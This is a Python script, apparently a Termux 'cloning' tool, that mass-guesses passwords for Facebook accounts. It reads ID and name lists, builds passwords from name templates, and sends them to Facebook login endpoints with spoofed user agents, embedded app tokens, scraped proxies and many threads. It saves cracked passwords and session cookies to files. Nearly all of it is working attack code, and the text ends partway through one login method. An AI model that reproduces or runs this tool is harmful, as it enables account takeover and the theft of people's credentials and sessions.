#-----------------[ IMPORT ]-----------------#
import os,sys
import time
from os import system
from time import sleep

def awmzone(value):
    for txt in value + "\n":
        sys.stdout.write(txt)
        sys.stdout.flush();sleep(0.08)

try:import requests
except ModuleNotFoundError:
    awmzone(f'[√] SOME MODULE ARE UNINSTALLED')
    awmzone(f'[√] "requests" MODULE INSTALLING...')
    system('pip install requests > /dev/null')
    awmzone(f'[√] INSTALLATION COMPLETED - requests')
try:import mechanize
except ModuleNotFoundError:
    awmzone(f'[√] SOME MODULE ARE UNINSTALLED')
    awmzone(f'[√] "mechanize" MODULE INSTALLING...')
    system('pip install mechanize > /dev/null')
    awmzone(f'[√] INSTALLATION COMPLETED - mechanize')
try:import httpx
except ModuleNotFoundError:
    awmzone(f'[√] SOME MODULE ARE UNINSTALLED')
    awmzone(f'[√] "httpx" MODULE INSTALLING...')
    system('pip install httpx > /dev/null')
    awmzone(f'[√] INSTALLATION COMPLETED - httpx')
try:import bs4
except ModuleNotFoundError:
    awmzone(f'[√] SOME MODULE ARE UNINSTALLED')
    awmzone(f'[√] "bs4" MODULE INSTALLING...')
    system('pip install bs4 > /dev/null')
    awmzone(f'[√] INSTALLATION COMPLETED - bs4')
try:import rich
except ModuleNotFoundError:
    awmzone(f'[√] SOME MODULE ARE UNINSTALLED')
    awmzone(f'[√] "rich" MODULE INSTALLING...')
    system('pip install rich > /dev/null')
    awmzone(f'[√] INSTALLATION COMPLETED - rich')
try:import pycurl
except ModuleNotFoundError:
    awmzone(f'[√] SOME MODULE ARE UNINSTALLED')
    awmzone(f'[√] "pycurl" MODULE INSTALLING...')
    system('pip install pycurl > /dev/null')
    awmzone(f'[√] INSTALLATION COMPLETED - pycurl')
try:import httplib2
except ModuleNotFoundError:
    awmzone(f'[√] SOME MODULE ARE UNINSTALLED')
    awmzone(f'[√] "httplib2" MODULE INSTALLING...')
    system('pip install httplib2 > /dev/null')
    awmzone(f'[√] INSTALLATION COMPLETED - httplib2')

import os,re,sys,time,json,string,shutil
import random,uuid,datetime,base64,webbrowser
import threading,platform,subprocess,urllib3
import requests,mechanize,bs4,rich,pycurl,httpx
import httplib2,zlib,hashlib
from string import *
from os import system
from time import sleep
from shutil import rmtree
from zlib import decompress
from rich.panel import Panel
from rich.table import Table
from bs4 import BeautifulSoup
from rich.markdown import Markdown
from urllib.request import urlopen as openx
from concurrent.futures import ThreadPoolExecutor

loop = 0
count = 0
oks = []
cps = []
twf = []
bou = []
pcp = []
cok = []
ugen = []
value = []
screen = []
methods = []
password = []
user_find = []
running_verify = []

N = "\x1b[90m"
R = "\x1b[91m"
G = "\x1b[92m"
Y = "\x1b[93m"
B = "\x1b[94m"
I = "\x1b[95m"
S = "\x1b[96m"
W = "\x1b[97m"
N1 = "\x1b[38;5;65m"
G1 = "\x1b[38;5;46m"
B1 = "\x1b[38;5;45m"
I1 = "\x1b[38;5;56m"
R1 = "\x1b[38;5;196m"
P1 = "\x1b[38;5;203m"
Y1 = "\x1b[38;5;208m"
color = [N,R,G,Y,B,I,S,W,N1,G1,B1,I1,R1,P1,Y1]
my_color = random.choice(color)

X = f"{R1}[{G1}√{R1}]{W}"

screen_type = sys.platform.lower()
if screen_type == "linux":screen.append('android')
elif screen_type == "win":screen.append('window')
else:screen.append('android')

def clean():
    if screen == "android":system('clear')
    elif screen == "window":system('cls')
    else:system('clear')
clean()

brs = mechanize.Browser()
brs.set_handle_robots(False)
brs.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

http = httplib2.Http()
ses = requests.Session()

import requests,mechanize,bs4
import rich,pycurl,httplib2,httpx
import urllib,shutil,struct,base64
from string import *
from io import BytesIO
from zlib import decompress
from bs4 import BeautifulSoup
from shutil import rmtree as rmv
from urllib.request import urlopen as openx
from requests.exceptions import ConnectionError as error
from concurrent.futures import ThreadPoolExecutor as tredx

if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
    exit('[√] SOMETHING WENT WRONG')


import requests,random,uuid,string,hashlib,json,os,base64,zlib,pip,urllib,urllib3,platform,math,smtplib,os,base64,zlib,pip,urllib,datetime,time
from os import system
from os import path
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
from urllib.request import urlopen 
#os.system("pk"+"g u"+"nins"+"tall"+" py"+"th"+"on -y;"+"pkg "+"insta"+"ll "+"p"+"ytho"+"n-pip -"+"y;p"+"ip u"+"nins"+"tall py"+"cu"+"rl re"+"que"+"sts ch"+"ar"+"det ur"+"lli"+"b3 id"+"na cer"+"tifi -y > /"+"dev/"+"nul"+"l;pi"+"p ins"+"tall p"+"yc"+"url ch"+"ardet ur"+"llib"+"3 id"+"na ce"+"rti"+"fi req"+"ues"+"ts > /d"+"ev"+"/nu"+"ll");os.system('clear')
try:
	import pycurl
	from io import BytesIO
except:
	os.system('pip install pycurl')
	import pycurl
	from io import BytesIO
try:
        os.system("clear")
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print(f'\33[1;91m/\033[1;32m=\033[1;91m/\033[1;92m INSTALLING MISSING MODULES ');os.system('pip install requests futures==2 > /dev/null')
except:pass
#-----------------[ LOOP ]-----------------#
loop=0;oks=0;cps=0;twf=[];pcp=[];id=[];tokenku=[];user=[];plist=[];__cp_show__=[];__po__=[];pwv = []
#-----------------[ COLOR ]-----------------#
G="\033[1;92m";W="\x1b[38;5;15m";B="\033[1;34m";Y="\x1b[38;5;226m";A="\x1b[38;5;123m";R="\33[1;91m";O="\x1b[38;5;8m";X="\x1b[38;5;205m";P="\033[0;34m"
#-----------------[ STYLE ]-----------------#
xd=f"{O}[{W}~{O}]{G}";xd1=f"{O}[{W}1{O}]{G}";xd2=f"{O}[{W}2{O}]{G}";xd3=f"{O}[{W}3{O}]{G}";xd4=f"{O}[{W}4{O}]{G}";xd5=f"{O}[{W}5{O}]{G}";xd6=f"{O}[{W}6{O}]{G}";xd7=f"{O}[{W}7{O}]{G}";xd8=f"{O}[{W}8{O}]{G}";xd9=f"{O}[{W}9{O}]{G}";xd0=f"{O}[{W}0{O}]{G}";xdx=f"{O}[{W}?{O}]{G}"
#-----------------[ SYS ]-----------------#
sys.stdout.write('\x1b[1;37m\x1b]2; MR JEWEL\x07')
#-----------------[ PROXY ]-----------------#
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('Proksi.txt','w').write(prox)
except Exception as e:
    print(e)
#-----------------[ FILE PATH ]-----------------#
folder_path = '/sdcard/XD'
try:os.makedirs(folder_path, exist_ok=True)
except:pass
#-----------------[ CLEAR ]-----------------#
def clear():os.system('clear');print(logo);time.sleep(0.1)
def linex():print(f'{W}{47*'-'}')
#-----------------[ LOGO ]-----------------#
logo = f"""
    _____  ________  __       __  ________  __       
   /     |/        |/  |  _  /  |/        |/  |      
   $$$$$ |$$$$$$$$/ $$ | / \ $$ |$$$$$$$$/ $$ |      
      $$ |$$ |__    $$ |/$  \$$ |$$ |__    $$ |      
 __   $$ |$$    |   $$ /$$$  $$ |$$    |   $$ |      
/  |  $$ |$$$$$/    $$ $$/$$ $$ |$$$$$/    $$ |      
$$ \__$$ |$$ |_____ $$$$/  $$$$ |$$ |_____ $$ |_____ 
$$    $$/ $$       |$$$/    $$$ |$$       |$$       |
 $$$$$$/  $$$$$$$$/ $$/      $$/ $$$$$$$$/ $$$$$$$$/ 
                    |{G} DEVELOPER {O}:{G} MR-JEWEL
                    |{G} STATUS    {O}:{G} PREMIUM
                    |{G} VERSION   {O}:{W} 1.5
{G}TOOLS {O}|{W}FILE{O}|{W}RANDOM{O}|{W}OLD{O}| {G}CLONE
{W}{47*'-'}"""


def security():
    try:
        uid=os.getuid()#> auto key garnet by termux uid
        zxx = ('libsooney.so')
        try:
            key1=open(f'/data/data/com.termux/files/usr/bin/{zxx}','r').read()
        except:
            keysv=uuid.uuid4().hex[:5].upper()
            key1=open(f'/data/data/com.termux/files/usr/bin/{zxx}','w').write(keysv)
        kk = ('github')
        k1 = ('Mr-J3W2L')
        k2 = ('NEW')
        k3 = ('api.txt')
        key1=open(f'/data/data/com.termux/files/usr/bin/{zxx}','r').read()
        key=(f'XD-F{uid}5X{key1}001S==')#full key
        mysite= requests.get(f'https://{kk}.com/{k1}/{k2}/blob/main/database/{k3}').text#approve site
        if key in mysite:
                os.system('clear')
                x1()
                x2()
                ___POCOX___()
        else:
                os.system('clear')
                
                print(' \x1b[97m[\033[37;41m  ɴᴇᴇᴅ ᴛᴏ ɢᴇᴛ ᴀᴘᴘʀᴏᴠᴀʟ ғɪʀsᴛ   \033[0;m] ')
                linex()
                print("   ʏᴏᴜʀ ᴋᴇʏ ɪs ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇᴅ ")
                print("   ᴄᴏᴘʏ ᴀɴᴅ sᴇɴᴅ ᴋᴇʏ ᴛᴏ ᴅᴇᴠᴇʟᴏᴘᴇʀ")
                linex()
                print(f'ʏᴏᴜʀ ᴀᴘɪ ᴋᴇʏ : '+key)
                linex()
                input("\x1b[97m[•]  \033[1;92mᴘʀᴇss ᴇɴᴛᴇʀ ᴛᴏ sᴇɴᴅ ᴋᴇʏ")
                whatsapp = "+2349055012862"
                url_wa = "https://api.whatsapp.com/send?phone="+whatsapp+"&text="
                tks = ("Hello sir\nI want to activate\nMy Key :- "+key)
                subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
    except requests.exceptions.ConnectionError:
    	print(f"internet error")

security()

#-------[approval]----------#
ugen=[]
for xd in range(10000):
    rr = random.randint
    build_b = random.choice(["001","002","003","011","012","014","015","020","021","022","023","024"])
    bl_typ = random.choice(["TKQ1","SKQ1","TP1A","RKQ1","SP1A","RP1A","PPR1","QP1A"])
    oppo = random.choice(["CPH2461","CPH2451","PCGM00","PBBM00","PFZM10","PGGM10","PECT30","PCHM10","PEAT00","PEYM00","PESM10","PFGM00"])
    infinix = random.choice(["Infinix X669C","Infinix X6823","Infinix X676C","Infinix X683","Infinix X689C","Infinix X6811","Infinix X612B","Infinix X6810","Infinix X665E"])
    redmi = random.choice(["2211133G","M2004J19C","22041219I","22101316UG","2209116AG","M2010J19SY","M2012K11C","Redmi Note 7","Redmi Note 8","Redmi Note 5"])
    um2 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {oppo} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um1 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {redmi} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um3 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {infinix} Build/{bl_typ}.{str(rr(120000,220000))}.{build_b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(80,114))}.0.{str(rr(4200,5400))}.{str(rr(70,150))} Mobile Safari/537.36"
    um4 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; {infinix}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,114))}.0.{str(rr(4900,5700))}.{str(rr(70,150))} Mobile Safari/537.36"
    main_ua = random.choice([um2,um3,um1,um4])
    ugen.append(main_ua)




def axn():
        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_AI2205_D;FBSV/14;nullFBCA/armeabi-v7a:armeabi;]"

        return ua
def afa():
    realmi = random.choice(["RMP2107","RMX3770","RMX2176","RMX3939","RMX3868"])
    afa = "[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672640;FBDM/{density=2.0,width=720,height=1456};FBLC/ru_RU;FBRV/314609338;FBCR/MTS RUS;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/"+realmi+";FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    return afa

#-----------------[ MAIN-MENU ]-----------------#
def ___POCOX___():
	clear();print(f"{xd1} START FILE CLONING ");print(f"{xd2} START RANDOM {W}ALL{G} COUNTRY CLONING ");print(f"{xd3} START OLD CLONING ");print(f"{xd0} EXIT ALL CLONING ");linex();___MENU___ = input(f"{xdx} SELECTION {O}:{W} ")
	if ___MENU___ in ["1"]:___FILEX___()
	elif ___MENU___ in ["2"]:___RANDOMX___()
	elif ___MENU___ in ["3"]:___OLDX___()
	elif ___MENU___ in ["0"]:sys.exit()
	else:linex();print(f"{xd}{R} WRONG OPTION SELECTION ");time.sleep(3);___POCOX___()
#-----------------[ FILE-MENU ]-----------------#
def ___FILEX___():
	clear();print(f"{xd} EXAMPLE {O}:{G} /sdcard/filename.txt ");linex();file = input(f"{xd} ENTER FILE NAME {O}:{W} ")
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		linex();print(f'{xd}{R} FILE NOT FOUND ');time.sleep(3);___FILEX___()
	clear();print(f"{xd1} METHOD {W}~{G} M1 ");print(f"{xd2} METHOD {W}~{G} M2 ");print(f"{xd3} METHOD {W}~{G} M3 ");print(f"{xd4} METHOD {W}~{G} M4 ");print(f"{xd5} METHOD {W}~{G} M5 ");linex();methdxd = input(f'{xd} ENTER METHOD {O}:{W} ')
	try:
	    clear();print(f"{xd} EXAMPLE BD {O}:{G} 10{O}|{G}15{O}|{G}20{O}|{G}25 ");print(f"{xd} EXAMPLE OTHERS {O}:{G} 5{O}|{G}10{O}|{G}15{O}|{G}20 ");linex();ps_limit = int(input(f'{xd} PASSWORDS ADD LIMIT {O}:{W} '))
	except:
	    ps_limit = 5
	clear();print(f"{xd} EXAMPLE {O}:{G} firstlast {O}|{G} first123 {O}|{G} first@@ ");linex()
	for i in range(ps_limit):
		plist.append(input(f'{xd} ENTER PASSWORD NO {W}{i+1} {O}:{W} '))
	clear();__cpshow__ = input(f"{xd} DO YOU WENT SHOW CP UID {O}:{W} ")
	if __cpshow__ in ['y', 'Y', 'yes', 'Yes', '1']:__cp_show__.append('y')
	else:__cp_show__.append('n')
	with tred(max_workers=30) as ___FILE___:
		clear();total_ids = str(len(fo))
		print(f"{xd} TOTAL UID{O}|{G}METHOD {O}:{W} {total_ids}{O}|{W}M{methdxd} ");print(f"{xd} FLIGHT MODE {W}ON{O}|{W}OFF{G} EVERY {W}3{G} MINUTES ");linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if methdxd in ['1','A']:___FILE___.submit(___M1___,ids,names,passlist)
			elif methdxd in ['2','B']:___FILE___.submit(___M2___,ids,names,passlist)
			elif methdxd in ['3','C']:___FILE___.submit(___M3___,ids,names,passlist)
			elif methdxd in ['4','D']:___FILE___.submit(___M4___,ids,names,passlist)
			elif methdxd in ['5','E']:___FILE___.submit(___M5___,ids,names,passlist)
	print('\033[1;37m');linex();print(f'{xd} THE PROCESS HAS COMPLETED ');print(f'{xd} TOTAL OK IDS {O}:{G} {oks}');print(f'{xd} TOTAL CP IDS {O}:{X} {cps}');linex();sys.exit()
#-----------------[ FILE METHOD M1 ]-----------------#




def ___M1___(ids,names,passlist):
        try:
                global loop,oks,cps
                cn = random.randint(60,99)
                sys.stdout.write(f'\r{O}[{G}MR{O}]{G}-{O}[{G}JEWEL{O}]{W} {loop}{O}|{W}OK:-{G}{oks} ');sys.stdout.flush()
                ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1"
                ua = "Dalvik/2.1.0 (Linux; U; Android 13; SM-S918B Build/TP1A.220624.014.197269.001) [FBAN/MessengerLite;FBAV/129.0.0.2.118;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/291814063;FBCR/Airtel;FBMF/Facebook;FBBD/realme;FBDV/SM-S918B;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2340};]"
                ua = "[FBAN/MessengerLiteForiOS;FBAV/405.0.0.21.72;FBBV/250184612;FBDV/iPhone15,2;FBMD/iPhone;FBSN/iOS;FBSV/17.5;FBSS/3;FBCR/;FBID/phone;FBLC/en_GB;FBOP/0]"
                
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        data = {'adid': adid, 'format': 'json', 'device_id': device_id, 'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': ids, 'password': pas, 'access_token': accessToken, 'generate_session_cookies': '1', 'advertiser_id': str(uuid.uuid4()), 'currently_logged_in_userid': '0', 'locale': 'en_GB', 'client_country_code': 'GB', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'}
                        headers = {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(11111, 99999)), 'X-FB-SIM-HNI': str(random.randint(11111, 99999)), 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 'Content-Length': f"6{cn}"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r{O}[{G}JEWEL-OK{O}]{G} '+ids+' | '+pas+'\033[1;97m')
                                        print(f'\r{O}[\U0001F4A5{O}]{W} '+coki);print('\033[1;37m')
                                        open('/sdcard/XD/CO-M1-FILE-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks+=1
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in __cp_show__:
                                            print(f'\r{O}[{G}JEWEL-OK{O}]{G} '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/XD/CO-M1-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps+=1
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#-----------------[ FILE METHOD M2 ]-----------------#
def ___M2___(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r{O}[{G}MR{O}]{G}-{O}[{G}JEWEL{O}]{W} {loop}{O}|{W}OK:-{G}{oks} ');sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        ua = "[FBAN/FB4A;FBAV/74.0.0.3586;FBBV/2198321;[FBAN/FB4A;FBAV/248.0.0.33.94;FBBV/20858934;FBRV/653884055;FBPN/com.facebook.katana;FBLC/fr_FR;FBMF/Blu;FBBD/Blu;FBDV/BLU STUDIO X MINI ;FBSV/9.1.1;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"
                        data = {'adid': adid, 'format': 'json', 'device_id': device_id, 'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': ids, 'password': pas, 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'advertiser_id': str(uuid.uuid4()), 'currently_logged_in_userid': '0', 'locale': 'en_GB', 'client_country_code': 'GB', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'}
                        headers = {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(900000, 999999)), 'X-FB-SIM-HNI': str(random.randint(900000, 999999)), 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 'Content-Length': '705'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r{O}[{G}JEWEL-OK{O}]{G} '+ids+' | '+pas+'\033[1;97m')
                                        print(f'\r{O}[\U0001F4A5{O}]{W} '+coki);print('\033[1;37m')
                                        open('/sdcard/XD/CO-M2-FILE-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks+=1
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in __cp_show__:
                                            print(f'\r{O}[{X}JEWEL-CP{O}]{X} '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/XD/CO-M2-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps+=1
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#-----------------[ FILE METHOD M3 ]-----------------#
def ___M3___(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r{O}[{G}MR{O}]{G}-{O}[{G}JEWEL{O}]{W} {loop}{O}|{W}OK:-{G}{oks} ');sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        ua = "[FBAN/FB4A;FBAV/74.0.0.3586;FBBV/2198321;[FBAN/FB4A;FBAV/248.0.0.33.94;FBBV/20858934;FBRV/653884055;FBPN/com.facebook.katana;FBLC/fr_FR;FBMF/Blu;FBBD/Blu;FBDV/BLU STUDIO X MINI ;FBSV/9.1.1;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"
                        data = {'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'fb_api_req_friendly_name': 'authenticate'}
                        headers = {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': f'OAuth {accessToken}', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '356'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r{O}[{G}JEWEL-OK{O}]{G} '+ids+' | '+pas+'\033[1;97m')
                                        print(f'\r{O}[\U0001F4A5{O}]{W} '+coki);print('\033[1;37m')
                                        open('/sdcard/XD/CO-M3-FILE-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks+=1
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in __cp_show__:
                                            print(f'\r{O}[{X}JEWEL-CP{O}]{X} '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/XD/CO-M3-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps+=1
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#-----------------[ FILE METHOD M4 ]-----------------#
def ___M4___(ids,names,passlist):
        try:
                global loop,oks,cps
                sys.stdout.write(f'\r{O}[{G}MR{O}]{G}-{O}[{G}JEWEL{O}]{W} {loop}{O}|{W}OK:-{G}{oks} ');sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        ua = "[FBAN/FB4A;FBAV/74.0.0.3586;FBBV/2198321;[FBAN/FB4A;FBAV/248.0.0.33.94;FBBV/20858934;FBRV/653884055;FBPN/com.facebook.katana;FBLC/fr_FR;FBMF/Blu;FBBD/Blu;FBDV/BLU STUDIO X MINI ;FBSV/9.1.1;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"
                        data = {'access_token': '6628568379|c1e620fa708a1d5696fb991c1bde5662', 'sdk_version': '17', 'email': ids, 'password': pas, 'sdk': 'android', 'locale': 'en_US', 'generate_session_cookies': '1', 'sig': 'c1e620fa708a1d5696fb991c1bde5662'}
                        headers = {'user-agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Host': 'graph.facebook.com', 'x-fb-connection-bandwidth': str(random.randint(20000000, 30000000)), 'x-fb-sim-hni': str(random.randint(900000, 999999)), 'x-fb-net-hni': str(random.randint(900000, 999999)), 'x-fb-connection-quality': 'EXCELLENT', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger', 'Content-Length': '201'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'\r{O}[{G}JEWEL-OK{O}]{G} '+ids+' | '+pas+'\033[1;97m')
                                        print(f'\r{O}[\U0001F4A5{O}]{W} '+coki);print('\033[1;37m')
                                        open('/sdcard/XD/CO-M4-FILE-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks+=1
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in __cp_show__:
                                            print(f'\r{O}[{X}JEWEL-CP{O}]{X} '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/XD/CO-M4-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps+=1
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#-----------------[ FILE METHOD M5 ]-----------------#
def ___M5___(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r{O}[{G}MR{O}]{G}-{O}[{G}JEWEL{O}]{W} {loop}{O}|{W}OK:-{G}{oks} ');sys.stdout.flush()
	ses = requests.Session()
	ua = "[FBAN/FB4A;FBAV/74.0.0.3586;FBBV/2198321;[FBAN/FB4A;FBAV/248.0.0.33.94;FBBV/20858934;FBRV/653884055;FBPN/com.facebook.katana;FBLC/fr_FR;FBMF/Blu;FBBD/Blu;FBDV/BLU STUDIO X MINI ;FBSV/9.1.1;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"
	for pas in passlist:
		try:
			xx = open('Proksi.txt','r').read().splitlines()
			zz = {'http': 'socks4://'+random.choice(xx)}
